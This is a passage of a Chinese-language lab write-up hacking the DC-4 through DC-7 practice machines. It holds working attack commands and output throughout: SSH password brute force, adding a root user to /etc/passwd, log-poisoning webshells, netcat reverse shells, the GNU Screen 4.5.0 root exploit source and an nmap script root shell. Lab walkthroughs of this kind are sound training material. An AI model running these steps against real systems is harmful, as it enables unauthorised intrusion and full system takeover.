-v表示显示具体的</span></span><br><span class="line">root@kali:~<span class="comment"># hydra -L users.txt -P pswd.txt ssh://192.168.126.149 -t 64 -f -v</span></span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.149</span>   login: jim   password: jibril04</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/john<span class="comment"># ssh jim@192.168.126.149 </span></span><br><span class="line">jim@<span class="number">192.168</span>.<span class="number">126.149</span><span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i68</span></span><br><span class="line"><span class="string">You have mail.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#发现邮件，查看邮件信息</span></span><br><span class="line"><span class="string">jim@dc-4:~$ cd /var/mail</span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$ ls</span></span><br><span class="line"><span class="string">jim  www-data</span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$ cat jim</span></span><br><span class="line"><span class="string">From charles@dc-4 Sat Apr 06 21:15:46 2019</span></span><br><span class="line"><span class="string">Return-path: &lt;charles@dc-4&gt;</span></span><br><span class="line"><span class="string">Hi Jim,</span></span><br><span class="line"><span class="string">I'</span>m heading off on holidays at the <span class="keyword">end</span> of today, so the boss asked me to give you my password just <span class="keyword">in</span> case anything goes wrong.</span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br></pre></td></tr></table></figure>

<p><strong>信中给出了charles的密码，切换账户，查看是否有提权的途径，发现teehee命令可以执行root权限</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> charles on dc<span class="literal">-4</span>:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc<span class="literal">-4</span>:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br><span class="line"></span><br><span class="line">root@dc<span class="literal">-4</span>:/home/jim/backups<span class="comment"># teehee --help #查看teehee的用法</span></span><br><span class="line">Usage: teehee [<span class="type">OPTION</span>]... [<span class="type">FILE</span>]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  <span class="literal">-a</span>, -<span class="literal">-append</span>              append to the given FILEs, <span class="keyword">do</span> not overwrite</span><br><span class="line">  <span class="literal">-i</span>, -<span class="literal">-ignore</span><span class="literal">-interrupts</span>   ignore interrupt signals</span><br><span class="line">  <span class="literal">-p</span>                        diagnose errors writing to non pipes</span><br><span class="line">      -<span class="literal">-output</span><span class="literal">-error</span>[=<span class="type">MODE</span>]   set behavior on write error.  See MODE below</span><br><span class="line">      -<span class="literal">-help</span>     display this help and <span class="keyword">exit</span></span><br><span class="line">      -<span class="literal">-version</span>  output version information and <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#teehee -a 表示写入文件，但是不会覆盖，所以可以通过写入一个root用户来执行root权限</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> echo <span class="string">"admin::0:0:admin::/bin/bash"</span>|sudo teehee <span class="literal">-a</span> /etc/passwd</span><br><span class="line">admin::<span class="number">0</span>:<span class="number">0</span>:admin::/bin/bash  <span class="comment">##[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> su admin</span><br><span class="line">root@dc<span class="literal">-4</span>:/home/charles<span class="comment"># cd /root</span></span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># cat flag.txt </span></span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P </span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span>  </span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat crontab # 可见文件有格式将授权命令写入该文件授权root bash</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> cat /etc/crontab</span></span><br><span class="line"><span class="string"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="string"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="string"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="string"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="string"># that none of the other crontabs do.</span></span><br><span class="line"><span class="string">SHELL=/bin/sh</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo  "</span>* * * * * root chmod <span class="number">4777</span> /bin/sh<span class="string">" | sudo teehee -a /etc/crontab</span></span><br><span class="line"><span class="string">#时间部分全部填写为*，默认这个定时任务每分钟执行一次</span></span><br><span class="line"><span class="string">#通过执行的脚本将 /bin/sh 的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> /bin/sh</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls /root</span></span><br><span class="line"><span class="string">flag.txt</span></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="DC-5渗透过程"><a href="#DC-5渗透过程" class="headerlink" title="DC-5渗透过程"></a><strong>DC-5渗透过程</strong></h2><p><strong>看了下网站首页没啥切入点，爆破下后台路径，发现了两个新路径</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:/<span class="comment"># dirb http://192.168.126.155/ -X .php -S</span></span><br><span class="line">URL_BASE: http://<span class="number">192.168</span>.<span class="number">126.155</span>/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt <span class="comment">#默认字典</span></span><br><span class="line">---- Scanning URL: http://<span class="number">192.168</span>.<span class="number">126.155</span>/ ----</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/ab<span class="built_in">out-us</span>.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4292</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/contact.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4282</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/faq.php (CODE:<span class="number">200</span>|SIZE:<span class="number">5645</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/footer.php (CODE:<span class="number">200</span>|SIZE:<span class="number">17</span>)  <span class="comment">#隐藏路径</span></span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/index.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4025</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/solutions.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4100</span>) </span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/thankyou.php (CODE:<span class="number">200</span>|SIZE:<span class="number">852</span>)  <span class="comment">#隐藏路径</span></span><br></pre></td></tr></table></figure>

<p><strong>提示thankyou.php存在文件包含漏洞，测试下发现确实可以，查看日志文件，可以写入一句话木马</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">126.155</span>/thankyou.php?file=../../../etc/passwd</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.155</span>/thankyou.php?file=/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>

<p><strong>写入payload到日志，因为错误的请求会写入error.log，查看日志，成功插入，蚁剑连接成功！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/4.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/5.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/3.png" alt></p>
<p><strong>可以在本地再上传一句话木马文件，方便连接！用虚拟终端反弹shell到主机上</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">(www<span class="literal">-data</span>:/var/www/html) <span class="variable">$</span> nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2333</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvvp 2333</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">2333</span> ...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">126.155</span>: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.126.33</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.126.155</span>] <span class="number">47749</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">'import pty;pty.spawn("/bin/bash")'</span>  </span><br><span class="line"></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:~/html<span class="variable">$</span> find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null <span class="comment">#查看sudo权限</span></span><br><span class="line">/bin/screen<span class="literal">-4</span>.<span class="number">5.0</span>  <span class="comment">#发现了一个可能可以利用的文件</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">GNU Screen <span class="number">4.5</span>.<span class="number">0</span> - Local Privilege Escalation                                              | exploits/linux/local/<span class="number">41154</span>.sh</span><br><span class="line">GNU Screen <span class="number">4.5</span>.<span class="number">0</span> - Local Privilege Escalation (PoC)                                        | exploits/linux/local/<span class="number">41152</span>.txt</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># searchsploit -m 41154.sh  #把一个exp拷贝到当前工作目录,参数后加目标id</span></span><br><span class="line">  Exploit: GNU Screen <span class="number">4.5</span>.<span class="number">0</span> - Local Privilege Escalation</span><br><span class="line">      URL: https://www.exploit<span class="literal">-db</span>.com/exploits/<span class="number">41154</span></span><br><span class="line">     Path: /usr/share/exploitdb/exploits/linux/local/<span class="number">41154</span>.sh</span><br><span class="line">File Type: Bourne<span class="literal">-Again</span> shell script, ASCII text executable, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/<span class="number">41154</span>.sh</span><br></pre></td></tr></table></figure>

<p><strong>按照exp的说明进行操作编译，上传至靶机，注意只能上传到/tmp目录下，执行即可提权</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:/tmp<span class="comment"># vi libhax.c</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    printf(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">root@kali:/tmp<span class="comment"># gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span></span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># vi rootshell.c</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">root@kali:/tmp<span class="comment"># gcc -o /tmp/rootshell /tmp/rootshell.c</span></span><br><span class="line"></span><br><span class="line">root@kali:~/tools<span class="comment"># cat 41154.sh  #将剩下的写入</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">echo <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line">cd /etc</span><br><span class="line">umask <span class="number">000</span> <span class="comment"># because</span></span><br><span class="line">screen <span class="literal">-D</span> <span class="literal">-m</span> <span class="literal">-L</span> ld.so.preload echo <span class="operator">-ne</span>  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line">echo <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen <span class="literal">-ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br><span class="line"></span><br><span class="line">root@kali:~/tools<span class="comment"># ls</span></span><br><span class="line"><span class="number">41154</span>.sh    libhax.so   rootshell</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过蚁剑上传至/tmp目录下</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> chmod +x <span class="number">41154</span>.sh</span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> ./<span class="number">41154</span>.sh</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line"><span class="string">' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">[+] Triggering...</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># cat thisistheflag.txt</span></span><br><span class="line"><span class="string">cat thisistheflag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">888b    888 d8b                                                      888      888 888 888 </span></span><br><span class="line"><span class="string">8888b   888 Y8P                                                      888      888 888 888 </span></span><br><span class="line"><span class="string">88888b  888                                                          888      888 888 888 </span></span><br><span class="line"><span class="string">888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 </span></span><br><span class="line"><span class="string">888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 </span></span><br><span class="line"><span class="string">888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P </span></span><br><span class="line"><span class="string">888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  </span></span><br><span class="line"><span class="string">888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 </span></span><br><span class="line"><span class="string">                                                                                          </span></span><br><span class="line"><span class="string">                                                                                         </span></span><br><span class="line"><span class="string">Once again, a big thanks to all those who do these little challenges,</span></span><br><span class="line"><span class="string">and especially all those who give me feedback - again, it'</span>s all greatly</span><br><span class="line">appreciated.  :-)</span><br><span class="line"></span><br><span class="line">I also want to send a big thanks to all those who find the vulnerabilities</span><br><span class="line">and create the exploits that make these challenges possible.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-6渗透过程"><a href="#DC-6渗透过程" class="headerlink" title="DC-6渗透过程"></a><strong>DC-6渗透过程</strong></h2><p><strong>nmap发现打开了22/80端口，whatweb查看指纹信息，发现是wordpress系统，而且存在重定向，设置地址解析，用dirb爆破后台路径，wpscan扫描网站用户，提示用对应的密码本，爆破得到账户密码！</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># whatweb  -v 192.168.126.156  #详细扫描输出</span></span><br><span class="line">WhatWeb report <span class="keyword">for</span> http://<span class="number">192.168</span>.<span class="number">126.156</span></span><br><span class="line">Status    : <span class="number">301</span> Moved Permanently</span><br><span class="line">Title     : &lt;None&gt;</span><br><span class="line">IP        : <span class="number">192.168</span>.<span class="number">126.156</span></span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line">...</span><br><span class="line">WhatWeb report <span class="keyword">for</span> http://wordy/</span><br><span class="line">Status    : <span class="number">200</span> OK</span><br><span class="line">Title     : Wordy &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">IP        : <span class="number">192.168</span>.<span class="number">126.156</span></span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line">Summary   : Script[<span class="type">text</span>/<span class="type">javascript</span>], PoweredBy[<span class="type">WordPress</span>], WordPress[<span class="number">5.1</span><span class="type">.1</span>], MetaGenerator[<span class="type">WordPress</span> <span class="number">5.1</span><span class="type">.1</span>], HTTPServer[<span class="type">Debian</span> <span class="type">Linux</span>][<span class="type">Apache</span>/<span class="number">2.4</span><span class="type">.25</span> (<span class="type">Debian</span>)], UncommonHeaders[<span class="type">link</span>], Apache[<span class="number">2.4</span><span class="type">.25</span>], JQuery[<span class="number">1.12</span><span class="type">.4</span>], HTML5</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://wordy  -e u  #发现存在用户</span></span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp<span class="literal">-json</span>/wp/v2/users/?per_page=<span class="number">100</span>&amp;page=<span class="number">1</span></span><br><span class="line">[+] graham</span><br><span class="line">[+] mark</span><br><span class="line">[+] sarah</span><br><span class="line">[+] jens</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># dirb http://wordy  #爆破后台路径</span></span><br><span class="line">URL_BASE: http://wordy/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">---- Entering directory: http://wordy/wp<span class="literal">-admin</span>/network/ ----</span><br><span class="line">+ http://wordy/wp<span class="literal">-admin</span>/network/admin.php (CODE:<span class="number">302</span>|SIZE:<span class="number">0</span>)                                                </span><br><span class="line">+ http://wordy/wp<span class="literal">-admin</span>/network/index.php (CODE:<span class="number">302</span>|SIZE:<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据提示，选择此密码本（含有k01的密码）</span></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#用wpscan进行尝试，花费的时间有点久，成功爆破！</span></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://wordy/wp-login.php   -U dc_use.txt -P passwords.txt               </span></span><br><span class="line">[<span class="type">SUCCESS</span>] - mark / helpdesk01</span><br></pre></td></tr></table></figure>

<p><strong>拿到mark用户的密码以后，登陆到后台，没啥头绪，看了下别人的博客，说是存在active管理插件命令执行漏洞</strong></p>
<p><strong>searchsploit下此漏洞，发现存在，抓包修改反弹shell链接kail！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# searchsploit activity monitor</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Activity Monitor 2002 2.6 - Remote Denial of Service                                       | exploits/windows/dos/22690.c</span><br><span class="line">RedHat Linux 6.0/6.1/6.2 - 'pam_console' Monitor Activity After Logout                     | exploits/linux/local/19900.c</span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection   | exploits/php/webapps/45274.html</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">root@kali:~# cat /usr/share/exploitdb/exploits/php/webapps/45274.html</span><br><span class="line">About:</span><br><span class="line">===========</span><br><span class="line">Component: Plainview Activity Monitor (Wordpress plugin)</span><br><span class="line">Vulnerable version: 20161228 and possibly prior</span><br><span class="line">Fixed version: 20180826</span><br><span class="line">CVE-ID: CVE-2018-15877</span><br><span class="line">CWE-ID: CWE-78</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/7.png" alt></p>
<p><strong>进入服务器后，查找提示，发现了graham的账号和密码，ssh连接登陆graham！查看下权限，发现jens用户可以执行root权限，将反弹shell写入backups.sh，并以jens用户执行，成功反弹！得到jens用户，再次查看root权限，发现jens可以以root执行nmap命令</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c "import pty;pty.spawn('/bin/bash')"</span><br><span class="line">www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt</span><br><span class="line">cat things-to-do.txt</span><br><span class="line">Things to do:</span><br><span class="line"></span><br><span class="line">- Restore full functionality for the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present for Sarah's farewell party</span><br><span class="line">- Add new user: graham -GSo7isUM1D4 ye's - done</span><br><span class="line">- Apply for the OSCP course</span><br><span class="line">- Buy new laptop for Sarah's replacement</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">写入反弹shell</span></span><br><span class="line">graham@dc-6:/home/jens$ echo nc 192.168.126.33 1324 -e /bin/bash &gt; backups.sh </span><br><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">发现nmap可以提权</span></span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for jens on dc-6:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jens may run the following commands on dc-6:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">编写一个nmap的脚本，执行反弹shell得到root</span></span><br><span class="line">echo 'os.execute("/bin/sh")' &gt;  chj.nse</span><br><span class="line">sudo nmap --script=/home/jens/chj.nse</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-09-18 17:36 AEST</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">cd /root</span><br><span class="line">ls  </span><br><span class="line">theflag.txt</span><br><span class="line">cat theflag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-7渗透过程"><a href="#DC-7渗透过程" class="headerlink" title="DC-7渗透过程"></a><strong>DC-7渗透过程</strong></h2><p>这次的靶机渗透和以往的思路不太一样，也算拓展了思维。网站给了个提示，Google下发现了数据库文件。</p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/8.jpg" alt></p>
<p>发现了数据库信息，ssh连接登陆成功！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$servername = <span class="string">"localhost"</span>;</span><br><span class="line">	$username = <span class="string">"dc7user"</span>;</span><br><span class="line">	$password = <span class="string">"MdR3xOgB7#dW"</span>;</span><br><span class="line">				MdR3xOgB7<span class="comment">#dw</span></span><br><span class="line">	$dbname = <span class="string">"Staff"</span>;</span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>登陆后，提示我们有一封邮件，打开发现是一个定期执行的脚本，具体查看该脚本权限，发现拥有root权限，只要在其中加入反弹shell命令，就可以提权！</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br><span class="line">dc7user@dc<span class="literal">-7</span>:/var/mail<span class="variable">$</span> cat dc7user </span><br><span class="line">To: root@dc<span class="literal">-7</span></span><br><span class="line">Subject: Cron &lt;root@dc<span class="literal">-7</span>&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME<span class="literal">-Version</span>: <span class="number">1.0</span></span><br><span class="line">Content<span class="literal">-Type</span>: text/plain; charset=UTF<span class="literal">-8</span></span><br><span class="line">Content<span class="literal">-Transfer</span><span class="literal">-Encoding</span>: <span class="number">8</span>bit</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;HOME=/root&gt;</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;LOGNAME=root&gt;</span><br><span class="line">Message<span class="literal">-Id</span>: &lt;E1kJBmQ<span class="literal">-0000IC</span><span class="literal">-5x</span>@dc<span class="literal">-7</span>&gt;</span><br><span class="line">Date: Fri, <span class="number">18</span> Sep <span class="number">2020</span> <span class="number">18</span>:<span class="number">30</span>:<span class="number">06</span> +<span class="number">1000</span></span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [<span class="type">success</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看定时计划内容</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-7</span>:/opt/scripts<span class="variable">$</span> cat backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql<span class="literal">-dump</span> -<span class="literal">-result</span><span class="operator">-file</span>=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar <span class="literal">-czf</span> /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg -<span class="literal">-pinentry</span><span class="literal">-mode</span> loopback -<span class="literal">-passphrase</span> PickYourOwnPassword -<span class="literal">-symmetric</span> /home/dc7user/backups/website.sql</span><br><span class="line">gpg -<span class="literal">-pinentry</span><span class="literal">-mode</span> loopback -<span class="literal">-passphrase</span> PickYourOwnPassword -<span class="literal">-symmetric</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br><span 